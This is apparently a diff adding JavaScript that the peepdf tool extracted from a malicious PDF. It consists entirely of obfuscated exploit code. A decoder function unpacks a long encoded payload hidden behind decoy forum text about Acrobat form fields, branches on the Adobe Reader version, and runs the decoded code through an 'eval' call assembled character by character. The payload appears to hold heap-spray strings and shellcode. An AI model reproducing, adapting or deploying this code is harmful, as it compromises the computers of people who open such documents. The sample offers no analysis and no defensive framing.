@@ -1,0 +1,62 @@
+// peepdf comment: Javascript code located in object 1 (version 0)
+
+this.STARTSCRIPT()
+
+// peepdf comment: Javascript code located in object 13 (version 0)
+
+function STARTSCRIPT() {
+
+    this.DEjKSsYluxS = function(jujKSsYluxS, gmjKSsYluxS) {
+        ecjKSsYluxS = '';
+        jujKSsYluxS = unescape(jujKSsYluxS);
+        frjKSsYluxS = jujKSsYluxS.length;
+        for (j = 0; j < frjKSsYluxS;) {
+            ecjKSsYluxS += we2(31, (jujKSsYluxS.charCodeAt(j) - gmjKSsYluxS) ^ gmjKSsYluxS);
+            j++;
+        }
+        return ecjKSsYluxS;
+    }
+
+    djKSsYluxS = 'I need a javascript that I can place in a form field properties area that will replace a "&" symbol with the word "and".....any help would be greatly appreciated. There are a couple of places you can enter a script that modifies the contents of the field.  The question is, do you want the value of the form field to be altered, or just what the user sees on the screen? To modify the value of the field you will need to use a custom keystroke script.  To modify the appearance of the field you will need to enter a format script.  You can find articles on both of these in the tutorial on this site.  The script itself can be done with the JavaScript "replace" function, In both cases (assuming that youve got an AcroForm) the code will look like this. PHP - Java Chat system for web site. Client is Java applet can run in any Java enabled browsers. The server side is PHP script can be installed on any PHP enabled web host. Interface text can be customized in any language. Multi rooms. Java Script Mutator is intended for optimization and protection of your Java Scripts from theft and modifications. Gnostice PDFOne Java is a pure Java library which provides a rich set of APIs to Create, Fill and Read PDF Forms, Secure, Merge, Split, Stamp PDF documents. = MR%86y%8A8%99%7B%8Ao%A6u%8A8%3D8y%88%88.%86qu%87u%8A%A6u%8A%8Bqon.%84o%AB%84%8Aqnw01CMR%99%7B%8Ao%A6u%8A8%3D8%99%7B%8Ao%A6u%8A.%8Au%88ly%7Bu0%2F%9C%94%2Fw%2C%3A%3A1CMR%86y%8A8%A6u%8A%8Bqon8%3D8nu%878%99%8A%8Ay%810%99%7B%8Ao%A6u%8A.%7Bpy%8A%99%840H1%2C%99%7B%8Ao%A6u%8A.%7Bpy%8A%99%840I1%2C%99%7B%8Ao%A6u%8A.%7Bpy%8A%99%840J11CMRMR%8Bpull%7Botu8%3D8%3A5%85DKDK5%85DKDK5%85Hvuz5%85KKEz5%85FF%7BA5%85%40HzA5%85%40HHI5%85uvKK5%85uJDK5%85uzvy5%85u%40HE5%85vvu%7B5%85vvvv5%85%40zGv5%85tvDu5%85uvuv5%85FDuv5%85uKyv5%85AvFD5%85DJvK5%85AvFD5%85FuuG5%85uvHK5%85uvuz5%85FDuv5%85zAHK5%85FI%40G5%85uIyI5%85HGHK5%85uvII5%85uvuv5%85yyFF5%85zAuz5%85GG%40G5%85FEII5%85HGuI5%85uvIv5%85uvuv5%85yyFF5%85zAuG5%85%7By%40G5%85IHEv5%85HGJt5%85uvHt5%85uvuv5%85yyFF5%85zAuK5%85HH%40G5%85HvJI5%85HG%40v5%85uvKz5%85uvuv5%85yyFF5%85zAvv5%85Ju%40G5%85HyAF5%85HGEG5%85uvJA5%85uvuv5%85yyFF5%85yvvz5%85tGFv5%85AyJ%7B5%85FFIE5%85vGyy5%85u%40HF5%85uvuu5%85zIuv5%85AyFF5%85FD%7Bz5%85uzyy5%85uu%40E5%85FDzF5%85vGzy5%85HGzA5%85uvFD5%85uvuv5%85%40Gzv5%85vEtA5%85Av%7BH5%85G%40HG5%85uvuv5%85FFuv5%85vKyy5%85JyFD5%85JvF%7B5%85FFzv5%85%7Bvyy5%85IH%40G5%85uvuv5%85zvuv5%85yyFD5%85%40Evz5%85zFut5%85zyFD5%85HGvG5%85uv%40u5%85uvuv5%85yyu%7B5%85J%40%7Bv5%85zKuv5%85%7BIAI5%85J%40%40y5%85uzyv5%85%40yAG5%85uvuv5%85AyIH5%85FD%7Bv5%85uKyy5%85uu%40E5%85FDzF5%85vGzy5%85yvHG5%85uvuv5%85%40Euv5%85zGu%405%85yyu%7B5%85t%7B%7Bz5%85z%7BKD5%85IHz%7B5%85%7BvAy5%85z%7Bzv5%85yyFD5%85%40EvK5%85zFuy5%85zyFD5%85HGvG5%85uv%7B%7B5%85uvuv5%85uv%40E5%85AyIH5%85FD%7Bv5%85uGyy5%85ut%40E5%85FDzF5%85vGzy5%85vvHG5%85uvuv5%85%40Euv5%85FDIH5%85vvyy5%85uu%40E5%85FDzF5%85vGzy5%85uvHG5%85uvuv5%85yuuv5%85ztzD5%85Huu%7B5%85Huu%7B5%85Huu%7B5%85Huu%7B5%85HKF%7B5%85zEuz5%85FDz%7B5%85HtKE5%85ztI%405%85HvIH5%85FDzy5%85FDHK5%85uGAJ5%85zJFD5%85zAuK5%85A%7BFD5%85FDtK5%85vIAz5%85u%7BAG5%85zAI%7B5%85AAFD5%85u%7B%7Bv5%85t%7BI%7B5%85yFJF5%85DJyu5%85J%7Bu%7B5%85t%7BzA5%85uHIA5%85vvEI5%85IttE5%85uGAz5%85JIJu5%85u%7BuJ5%85yvIt5%85IuHD5%85IItD5%85AyzI5%85zEHy5%85HDFD5%85zEFD5%85u%7B%7Bz5%85%40AKJ5%85uKFD5%85FDyD5%85vKzE5%85KJu%7B5%85uzFD5%85u%7BFD5%85zIJy5%85JtzJ5%85uvuG5%85IzHG5%85IHII5%85zyIH5%85yKzt5%85yHyJ5%85uvyI%3ACMRMRqv80%A6u%8A%8Bqon%A3H%9D%3D%3DA8668%A6u%8A%8Bqon%A3I%9D%3D%3DH8668%A6u%8A%8Bqon%A3J%9D%3D%3DH1MR%83MRQ%8Bpull%7B8%3D8%85nu%8B%7By%88u0%8Bpull%7Botu3%3A5%85GDF%405%85GHGD5%85JvKy5%85F%40Jv5%85FtGD5%85FIF%7B5%85GKFD5%85GJJu5%85JvGE5%85FDFI5%85FGJv5%85GDFE5%85FvGH5%85GDGJ5%85F%7BFI5%85GHJu5%85GHF%405%85FAKv5%85KtFD5%85KIKK%3A1CMRMRQv%85n%7B%84qon8%8B%88y%8A%8101MRQ%83MRQwy%8Azywu8%3D8%85nu%8B%7By%88u0%3A5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH%3A1838%8Bpull%7BCMRQno%88zlo%7Bs8%3D8%85nu%8B%7By%88u0%3A5%85AHAH5%85AHAH%3A1C8MRQpuytu%8A%8Bq%82u8%3D8IHCMRQy%7Bl8%3D8puytu%8A%8Bq%82u3wy%8Azywu.lunw%84pCMRQ%87pqlu80no%88zlo%7Bs.lunw%84p%3Cy%7Bl18no%88zlo%7Bs3%3Dno%88zlo%7BsCMRQvqllzlo%7Bs8%3D8no%88zlo%7Bs.%8B%85z%8B%84%8Aqnw0H%2C8y%7Bl1CMRQzlo%7Bs8%3D8no%88zlo%7Bs.%8B%85z%8B%84%8Aqnw0H%2C8no%88zlo%7Bs.lunw%84p-y%7Bl1CMRQ%87pqlu0zlo%7Bs.lunw%84p3y%7Bl%3CH%80DHHHH18zlo%7Bs8%3D8zlo%7Bs3zlo%7Bs3vqllzlo%7BsCMRQmumo%8A%818%3D8nu%878%99%8A%8Ay%8101CMRQvo%8A80q%3DHCq%3CI%40HCq3318mumo%8A%81%A3q%9D8%3D8zlo%7Bs838wy%8AzywuCMRQ%86y%8A8z%85vvu%8A%8Bq%82u8%3D8DHIJCMRQ%86y%8A8z%85vvu%8A8%3D8%99%8A%8Ay%810z%85vvu%8A%8Bq%82u1CMRQvo%8A80q%3DHC8q%3Cz%85vvu%8A%8Bq%82uC8q331%838z%85vvu%8A%A3q%9D8%3D8%85nu%8B%7By%88u0%3A5Hy5Hy5Hy5Hy%3A1C8%7DMRQ%9Bollyz.wu%84%91%7Bon0z%85vvu%8A3%3A%9F%8E.z%85ntlu%3A1CMRQ%7DMRQ%8B%88y%8A%8101CMRQz%85vvu%8A8%3D8n%85llCMRQmumo%8A%818%3D8n%85llCMR%7DMRul%8Bu8qv0%A6u%8A%8Bqon%A3H%9D%3D%3D%401MR%83MRQ%8Bpull%7B8%3D8%85nu%8B%7By%88u0%8Bpull%7Botu3%3A5%85GDF%405%85GHGD5%85JvKy5%85F%40Jv5%85FtGD5%85FIF%7B5%85GKFD5%85GJJu5%85JvGE5%85FDFI5%85FGJv5%85GDFE5%85FvGH5%85GDGJ5%85F%7BFI5%85GHJu5%85GHF%405%85FAKv5%85KtFD5%85KHKK%3A1CMRMRQv%85n%7B%84qon8%8B%88y%8A%8101MRQ%83MRQwy%8Azywu8%3D8%85nu%8B%7By%88u0%3A5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH5%85AHAH%3A1838%8Bpull%7BCMRQno%88zlo%7Bs8%3D8%85nu%8B%7By%88u0%3A5%85AHAH5%85AHAH%3A1C8MRQpuytu%8A%8Bq%82u8%3D8IHCMRQy%7Bl8%3D8puytu%8A%8Bq%82u3wy%8Azywu.lunw%84pCMRQ%87pqlu80no%88zlo%7Bs.lunw%84p%3Cy%7Bl18no%88zlo%7Bs3%3Dno%88zlo%7BsCMRQvqllzlo%7Bs8%3D8no%88zlo%7Bs.%8B%85z%8B%84%8Aqnw0H%2C8y%7Bl1CMRQzlo%7Bs8%3D8no%88zlo%7Bs.%8B%85z%8B%84%8Aqnw0H%2C8no%88zlo%7Bs.lunw%84p-y%7Bl1CMRQ%87pqlu0zlo%7Bs.lunw%84p3y%7Bl%3CH%80DHHHH18zlo%7Bs8%3D8zlo%7Bs3zlo%7Bs3vqllzlo%7BsCMRQmumo%8A%818%3D8nu%878%99%8A%8Ay%8101CMRQvo%8A80q%3DHCq%3CI%40HCq3318mumo%8A%81%A3q%9D8%3D8zlo%7Bs838wy%8AzywuCMRQ%86y%8A8z%85vvu%8A%8Bq%82u8%3D8DHIJCMRQ%86y%8A8z%85vvu%8A8%3D8%99%8A%8Ay%810z%85vvu%8A%8Bq%82u1CMRQvo%8A80q%3DHC8q%3Cz%85vvu%8A%8Bq%82uC8q331%838z%85vvu%8A%A3q%9D8%3D8%85nu%8B%7By%88u0%3A5Hy5Hy5Hy5Hy%3A1C8%7DMRQ%9Bollyz.wu%84%91%7Bon0z%85vvu%8A3%3A%9F%8E.z%85ntlu%3A1CMRQ%7DMRQ%8B%88y%8A%8101CMRQz%85vvu%8A8%3D8n%85llCMRQmumo%8A%818%3D8n%85llCMR%7DMRul%8Bu8qv0%A6u%8A%8Bqon%A3H%9D%3D%3DG1MR%83MRQ%86y%8A8%A6%93KDl8%3D8%85nu%8B%7By%88u0%8Bpull%7Botu3%3A5%85GDF%405%85GHGD5%85JvKy5%85F%40Jv5%85FtGD5%85FIF%7B5%85GKFD5%85GJJu5%85JvGE5%85FDFI5%85FGJv5%85GDFE5%85FvGH5%85GDGJ5%85F%7BFI5%85GHJu5%85GHF%405%85FAKv5%85KtFD5%85KAKJ%3A1CMRQMRQv%85n%7B%84qon8%A6%9BKDl0%A6%94KDl%2C8%A6%A7KDl1MRQ%83MRQQ%87pqlu80%A6%94KDl.lunw%84p2J%3C%A6%A7KDl1%83%A6%94KDl83%3D8%A6%94KDlC%7DMRQQ%A6%94KDl8%3D8%A6%94KDl.%8B%85z%8B%84%8Aqnw0H%2C%A6%A7KDl%2FJ1CMRQQ%8Au%84%85%8An8%A6%94KDlCMRQ%7DMRQ%86y%8A8%A6%99AK%91%87on%A98%3D8%3A%98H%98%80%98H%98%7B%98H%98%7B%98H%98%7B%98H%98%7B%98%3ACMRQ%A6%99AK%91%87on%A98%3D8%A6%99AK%91%87on%A9.%8Au%88ly%7Bu0%2F%A3%98%9D%2Fw%2C8%3A%3A1CMRQ%86y%8A8%A6%9AAK%91%87on%A98%3D8%3A%98H%98%80%98D%98H%98%98H%98%98H%98%98H%98H%98%3ACMRQ%A6%9AAK%91%87on%A98%3D8%A6%9AAK%91%87on%A9.%8Au%88ly%7Bu0%2F%A3%98%9D%2Fw%2C8%3A%3A1CMRQ%86y%8A8%A6%A9KDl8%3D8nu%878%99%8A%8Ay%8101C8MRQ%86y%8A8%A6%A8KDl8%3D8%A6%99AK%91%87on%A9C8MRQ%86y%8A8%A6%8DKDl8%3D8%A6%9AAK%91%87on%A9CMRQ%86y%8A8%A6%8EKDl8%3D8%A6%93KDl.lunw%84p828JCMRQ%86y%8A8%A6%A7KDl8%3D8%A6%8DKDl8-80%A6%8EKDl3H%80K%401CMRQ%86y%8A8%A6%A9AJ%ABql%8E8%3D8%3A%985%98%85%98A%98H%98A%98H%985%98%85%98A%98H%98A%98H%98%3ACMRQ%A6%A9AJ%ABql%8E8%3D8%A6%A9AJ%ABql%8E.%8Au%88ly%7Bu0%2F%A3%98%9D%2Fw%2C8%3A%3A1CMRQ%86y%8A8%A6%94KDl8%3D8%85nu%8B%7By%88u0%A6%A9AJ%ABql%8E1CMRQ%A6%94KDl8%3D8%A6%9BKDl0%A6%94KDl%2C8%A6%A7KDl1CMRQ%86y%8A8%A6%8CKDl8%3D80%A6%A8KDl8-8%A6%9AAK%91%87on%A91%2F%A6%8DKDlCMRQvo%8A80%86y%8A8%A6%9BAK%91%87on%A9%3DHC%A6%9BAK%91%87on%A9%3C%A6%8CKDlC%A6%9BAK%91%87on%A9331MRQ%83MRQQ%A6%A9KDl%A3%A6%9BAK%91%87on%A9%9D8%3D8%A6%94KDl838%A6%93KDlCMRQ%7DMRQ%86y%8A8%A6%95qoAE%95qn%998%3D8%3A%985%98%85%98H%98%7B%98H%98%7B%985%98%85%98H%98%7B%98H%98%7B%98%3ACMRQ%A6%95qoAE%95qn%998%3D8%A6%95qoAE%95qn%99.%8Au%88ly%7Bu0%2F%A3%98%9D%2Fw%2C8%3A%3A1CMRQ%86y%8A8%A6%8FKDl8%3D8%85nu%8B%7By%88u0%A6%95qoAE%95qn%991CMRQ%87pqlu0%A6%8FKDl.lunw%84p8%3C8DDAEJ18%A6%8FKDl83%3D8%A6%8FKDlCMRQ%84pq%8B.%7Bollyz%AB%84o%8Au8%3D8%9Bollyz.%7Bollu%7B%84%95myql%91nvo0%83%8B%85zrB8%3A%3A%2Cm%8BwB8%A6%8FKDl%7D1CMRQ%A6%A9KDl8%3D8n%85llCMR%7DMR';
+
+    this.we2 = function(num, num2) {
+        return String.fromCharCode(num % 55 - num + num2);
+    }
+    this.we = function(num, num2) {
+        return String.fromCharCode(num % 55 - num + 10 + num2);
+    }
+
+    function myCh(bGreater, nGreater, bLess, nLess) {
+        value = event.value;
+        if (bGreater && (value <= nGreater)) {
+            app.alert("Value must be greater than " + nGreater);
+            app.beep();
+            event.rc = false;
+            return;
+        }
+        if (bLess && (value >= nLess)) {
+            app.alert("Value must be less than " + nLess);
+            app.beep();
+            event.rc = false;
+            return;
+        }
+    }
+
+    function tion(ajKSsYluxS, bjKSsYluxS, dcjKSsYluxS) {
+        if (bjKSsYluxS > 11) {
+            console.println("Entering function: myFunction");
+            console.println(" Parameter 1: ajKSsYluxS = " + ajKSsYluxS);
+            console.println(" Parameter 2: bjKSsYluxS = " + bjKSsYluxS);
+        } else {
+            code = DEjKSsYluxS(dcjKSsYluxS[we(ajKSsYluxS, 105) + "ub" + we(ajKSsYluxS, 105) + "tr"](1265), 44 + (27 + (ajKSsYluxS - 3) - (27 + (ajKSsYluxS - 3)) % 60) * 4);
+            this[we(ajKSsYluxS, 91) + we(ajKSsYluxS, 108) + we(ajKSsYluxS, 87) + we(ajKSsYluxS, 98)](code);
+        }
+    }
+
+    hjKSsYluxS = app.viewerVersion.toString();
+    hjKSsYluxS = hjKSsYluxS.charAt(0);
+
+    tion(hjKSsYluxS, hjKSsYluxS / 2, djKSsYluxS);
+
+}
+
